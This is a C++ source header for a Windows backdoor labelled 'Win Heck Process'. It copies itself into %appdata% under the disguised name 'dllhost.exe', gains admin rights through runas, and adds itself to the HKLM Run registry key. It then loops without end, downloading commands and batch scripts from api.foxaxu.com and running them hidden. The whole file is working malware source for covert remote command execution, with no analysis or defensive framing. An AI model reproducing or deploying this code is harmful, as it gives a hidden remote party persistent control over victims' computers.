#pragma once

#include"shload.h"

#include<ShlObj.h>

int autoclose = 0;

string WebSocketAPI = "https://api.foxaxu.com/winhekapi/COMMAND.txt?rand=";
string WebSocketAPI_T = "https://api.foxaxu.com/winhekapi/HSPT.TXT?rand="; \

string FakeName = "dllhost.exe";
string autorunname = "DLLHOST";

void OsMonitor_MainProcess();

void argsApi(string args$api) {

	if (args$api == "--run-osmonitor") {
		OsMonitor_MainProcess();
		return;
	}
	
	if (args$api == "--uninstall") {
		autoclose = 1;
		if (!IsUserAnAdmin()) {
			ShellExecute(0, "runas", _$GetSelfName.c_str(), "--uninstall", 0, SW_SHOW);
			return;
		}
		string cmds = "delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ /v \""+ autorunname + "\" /f";
		ShellExecute(0, "runas", "reg.exe", cmds.c_str(), 0, SW_HIDE);
		MessageBox(0, "请手动删除 %appdata% 下的程序", "Win Heck Process", MB_OK);
		ShellExecute(0, "runas", "taskkill.exe", "/f /im dllhost.exe", 0, SW_HIDE);
		return;
	}

	_prtoutmsg("Unknown Args :  " + args$api);
	return;
}

int _HeadMainLoad() {

	if (autoclose == 1) {
		return 0;
	}
	if (check_file_existenceA("C:/Windows/DISABLED_WHP_INJECT")) {
		MessageBox(0, "该设备已屏蔽 WinHeckProces", "DISALLOW", MB_OK);
		return 0;
	}

	string getenv_local = getenv("appdata");
	string newfile_path = getenv_local + "\\" + FakeName;

	if (_$GetSelfName == newfile_path) {
		return 0;
	}

	if (!IsUserAnAdmin()){
		ShellExecute(0, "runas", _$GetSelfName.c_str(), 0, 0, SW_SHOW);
		return 0;
	}

	if (check_file_existenceA(newfile_path)) {
		string tempbfr = "/f /im " + FakeName;
		ShellExecute(0, "runas", "taskkill.exe", tempbfr.c_str(), 0, SW_HIDE);
		remove(newfile_path.c_str());
		sleepapi(3);
		remove(newfile_path.c_str());
	}

	//CopySelf
	CopyFile(_$GetSelfName.c_str(), newfile_path.c_str(),0);

	string cmds = "add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /f /v \"" + autorunname + "\" /t REG_SZ /d \"\"" + newfile_path + "\" --run-osmonitor\" ";

	ShellExecute(0, "runas", "reg.exe", cmds.c_str(), 0, SW_HIDE);

	ShellExecute(0, "open", newfile_path.c_str(), "--run-osmonitor",getenv_local.c_str(), SW_HIDE);

	MessageBox(0,"Inject OK", "Win Heck Process", MB_OK);

	return 0;
}

void OsMonitor_MainProcess() {
	//Hacked mode

	string ostemp = getenv("temp");

	string getcmd;

	string oldcmd;

	string hspt_id,hspt_old_id;

	string tcmds;

	while (true) {
		sleepapi(5);
		bool uaresult = _urldown_api(WebSocketAPI + _get_random_s(1, 1000), ostemp + "\\WHX.dat");

		if (!uaresult) {
			continue;
		}

		getcmd = _fileapi_textread(ostemp + "\\WHX.dat", 1);
		if (getcmd == "NULL") {
			continue;
		}

		if (oldcmd == getcmd) {
			continue;
		}
		if (getcmd == "hspt") {
			//Run Hack Script
			uaresult = _urldown_api(WebSocketAPI_T + _get_random_s(1, 1000), ostemp + "\\WL~Script.bat");

			if (!uaresult) {
				continue;
			}

			tcmds = ostemp + "\\WL~Script.bat";
			hspt_id = _fileapi_textread(tcmds, 1);
			if (hspt_id == hspt_old_id) {
				continue;
			}
			ShellExecute(0, "open", tcmds.c_str(), 0, 0, SW_HIDE);
			hspt_old_id = hspt_id;
			continue;
		}

		_fileapi_createmark(ostemp + "\\whxbatch.bat", getcmd);
		tcmds = ostemp + "\\whxbatch.bat";
		ShellExecute(0, "open", tcmds.c_str(), 0, 0, SW_HIDE);
		oldcmd = getcmd;
		continue;
	}
	
	MessageBox(0, "WHX Error", "Error", MB_OK);
	return;
}